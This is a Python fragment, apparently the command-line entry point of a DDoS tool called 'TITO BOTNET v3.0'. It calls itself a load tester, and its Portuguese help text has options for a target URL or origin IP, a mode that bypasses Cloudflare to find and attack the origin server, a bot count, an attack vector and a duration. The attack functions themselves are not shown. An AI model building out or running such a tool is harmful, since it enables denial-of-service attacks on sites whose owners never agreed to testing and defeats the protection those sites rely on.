def cli():
    p = argparse.ArgumentParser(description="TITO BOTNET v3.0 - Load Tester com bypass Cloudflare")
    p.add_argument("--url", help="URL do alvo (ex.: https://exemplo.com)")
    p.add_argument("--ip", help="IP direto (origin) - pula a busca")
    p.add_argument("--bypass", action="store_true", help="Descobre o origin e ataca direto")
    p.add_argument("--bots", type=int, default=50, help="Numero de bots/threads")
    p.add_argument("--vector", choices=VECTORS, default="http-get", help="Vetor de ataque")
    p.add_argument("--time", type=int, default=30, help="Duracao em segundos")
    p.add_argument("--port", type=int, default=0, help="Porta (opcional)")
    a = p.parse_args()
    if not a.url:
        p.print_help()
        sys.exit(1)
    if a.bypass:
        bypass_and_attack(a.url, a.bots, a.vector, a.time, a.port)
    elif a.ip:
        run_attack(a.url, a.bots, a.vector, a.time, a.port, ip_override=a.ip)
    else:
        run_attack(a.url, a.bots, a.vector, a.time, a.port)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        cli()
